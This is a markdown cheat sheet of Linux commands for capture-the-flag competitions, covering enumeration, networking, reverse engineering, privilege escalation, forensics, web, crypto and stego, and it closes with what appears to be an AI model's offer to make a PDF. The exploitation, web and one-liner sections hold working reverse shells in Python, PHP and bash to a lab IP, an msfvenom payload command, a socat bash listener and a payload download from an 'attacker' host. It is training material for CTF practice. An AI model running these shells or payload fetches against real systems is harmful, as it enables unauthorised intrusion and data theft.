# CTF Linux — Complete Command Cheat Sheet (ALL useful commands)

> A comprehensive, practical Linux command reference tailored for Capture The Flag (CTF) competitions. Includes reconnaissance, networking, binary analysis, reverse engineering, exploitation, forensics, web, crypto, stego, privilege escalation, and handy one-liners.

---

## 🧭 Basics & environment

```bash
whoami                # current user
id                    # uid/gid and groups
hostname -I           # IP addresses
uname -a              # kernel info
cat /etc/os-release   # distro info
pwd                   # working dir
ls -la                # list files (show dotfiles)
file binary           # detect file type
stat file             # file metadata
strings file          # printable strings in file
history               # command history
```

---

## 🔎 Recon / Enumeration

```bash
# Local
netstat -tulnp         # open ports & listening services
ss -tulnp              # modern netstat
ss -tunap | grep ESTAB # established connections
lsof -i                # open files with network sockets
ps aux                 # processes
ps -eo pid,user,cmd --sort=-%mem | head
crontab -l             # current user's cron jobs
sudo -l                # sudo permissions
id                     # effective user/group
getent passwd user     # user info

# File system
find / -perm -4000 -type f 2>/dev/null   # suid files
find / -type f -name "*.pem" 2>/dev/null
find / -maxdepth 2 -user nobody 2>/dev/null

# Network scanning (if allowed in challenge)
nmap -sC -sV -oA scan 10.10.10.5
nmap -p- -T4 10.10.10.5

# HTTP enumeration
curl -I http://target
curl -s http://target | head
nikto -h http://target
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target/FUZZ
```

---

## 🌐 Networking & pivoting

```bash
# Basic
ip a
ip route
route -n
ping -c 4 8.8.8.8
traceroute target
arp -a

# Netcat (nc)
nc -lvnp 4444                # listener TCP
nc -u -lvnp 4444             # UDP listener
nc target 80                 # raw connect
# Transfer files
nc -lvp 9001 > received.bin  # server
nc target 9001 < file.bin    # client

# Socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# SSH tunnel
ssh -L 8080:127.0.0.1:80 user@jump
# Port forwarding
ssh -R 9001:localhost:9001 user@remote
```

---

## 🧪 Binary analysis & reverse engineering

```bash
file binary
readelf -h binary          # ELF header
readelf -s binary          # symbols
objdump -d binary | less   # disassembly
objdump -Mintel -d binary  # Intel syntax
nm -n binary               # symbol table
strings -n 8 binary        # strings with min len 8
ldd binary                 # linked libraries
strace -o trace.txt ./a.out   # syscalls trace
ltrace -o ltrace.txt ./a.out  # library calls
gdb -q ./binary
# quick gdb run with breakpoint
gdb -q -ex 'break main' -ex 'run' -ex 'bt' --args ./binary
# decompilers
r2 binary                  # radare2
ghidra (gui)
```

---

## 🔓 Exploitation helpers

```bash
# ROP gadgets
ropper --file binary --search "pop rdi"
# Generate simple shellcode (msfvenom)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf
# Python reverse shell (x86_64)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.7",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Uploading files via common services
# HTTP using curl
curl -F "file=@local.bin" http://target/upload
# Using python3 -m http.server
python3 -m http.server 8000
# On target pull: wget http://attacker:8000/payload

# When escaping restricted shells
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh -i
TERM=xterm-256color bash -i
```

---

## 🔐 Privilege Escalation (local checks)

```bash
# Kernel / OS info
uname -a
cat /etc/issue
cat /etc/os-release
# SUID/SGID/Capabilities
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # file capabilities
# World writable dirs
find / -writable -type d 2>/dev/null
# Active services
ps aux --sort=-%mem | head
ss -tulpen
# Common checks
sudo -l                                     # sudo rights
cat /etc/passwd | awk -F: '{print $1}'       # users
for d in /var/backups /home /root; do ls -la $d 2>/dev/null; done
```

---

## 🔍 Forensics & artifact recovery

```bash
# Inspecting files
hexdump -C file | less
xxd file | less
binwalk -e firmware.bin        # carve files
foremost -i image.dd -o output # carve by headers
scalpel image.dd -o carved     # another carver
volatility -f mem.dump --profile=Linux... pslist  # memory analysis (depends on kernel)
strings -a file | less
```

---

## 🌐 Web / HTTP tools

```bash
# curl
curl -s -I http://target
curl -s -X POST -d "key=v" http://target
# Burp / proxy
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080
# PHP reverse shell
php -r '$sock=fsockopen("10.10.14.7",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# Common files
wget -qO- http://target/.git/config
```

---

## 🔐 Crypto & encoding utilities

```bash
# encodings
echo 'dGVzdA==' | base64 -d        # base64 decode
echo -n 'test' | md5sum
openssl enc -aes-256-cbc -d -in file.enc -pass pass:password
# Hash cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# ASN1 / cert
openssl x509 -in cert.pem -text -noout
```

---

## 🖼️ Stego & data carving

```bash
# stegsolve (java GUI)
# stegdetect
strings image.png | less
exiftool image.jpg
binwalk -e image.png
zsteg image.png                 # PNG LSB stego
steghide extract -sf image.jpg  # if password known: -p pass
```

---

## 🧩 Archive & compression (quick ref)

```bash
tar -xvf file.tar
tar -xvzf file.tar.gz
unzip file.zip
7z x file.7z
unrar x file.rar
```

---

## 🔁 Useful one-liners

```bash
# Find files owned by root that are writable by others
find / -type f -perm -o+w -user root 2>/dev/null

# Simple HTTP server for file serving
python3 -m http.server 8000

# Reverse shell (bash)
bash -i >& /dev/tcp/10.10.14.7/4444 0>&1

# Quick port scan (top ports) with nmap
nmap --top-ports 1000 -sV target

# Recursively search for strings (like password) in files
grep -R "password" / 2>/dev/null | less
```

---

## 🧰 Tools & wordlists (common locations)

```
/usr/bin, /usr/sbin, /usr/local/bin
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/seclists
/usr/share/metasploit-framework
```

---

## ✅ Final tips

* Always run `file` and `strings` on unknown binaries.
* Use non-destructive commands first (list, strings, file).
* When working live, capture everything (`tcpdump`, `script`, `strace`).
* Keep local copies of common tools (nmap, nc, python, gcc, socat, wget, curl, 7z).

---

*Want this saved as a downloadable PDF or added to your repo README? I can also make a short printable one-page version.*
